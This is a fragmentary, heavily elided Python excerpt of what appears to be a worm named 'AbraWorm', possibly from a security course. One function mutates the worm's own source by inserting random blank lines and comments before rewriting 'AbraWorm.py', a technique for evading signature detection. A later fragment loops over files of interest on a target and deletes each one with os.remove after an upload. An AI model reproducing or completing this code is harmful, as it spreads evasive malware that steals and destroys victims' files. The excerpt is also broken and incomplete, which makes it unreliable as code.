...
def mutate(filename):
    with open(filename, 'r') as file:
        ...
        print("At the beginning, the file has %d lines" % len(lines))

        #randomly insert new lines
        length = len(lines)
        start_index = random.randint(0, length - 1)
        end_index = random.randint(start_index, start_index + 10)
        for i in range(start_index, end_index):
            lines.insert(i, "\n")
        
        # we will put 10 comments in the code
        for i in range(0, 9):
            length = len(lines)
            ...
            # put the comment in a random line
        ...
        with open("AbraWorm.py", 'w') as new_file:
            for line in lines:
                new_file.write(line + "\n")
            new_file.close()
            print("At the end, the file has %d lines" % len(lines))
            return new_file
                ...
                if len(files_of_interest_at_target) > 0:
                    ...
                    try:
                        ...
                        for filename in files_of_interest_at_target:
                            ...
                            try:
                                os.remove(filename)
                                print("Upload done so deleting %s from my device successfully.", filename)
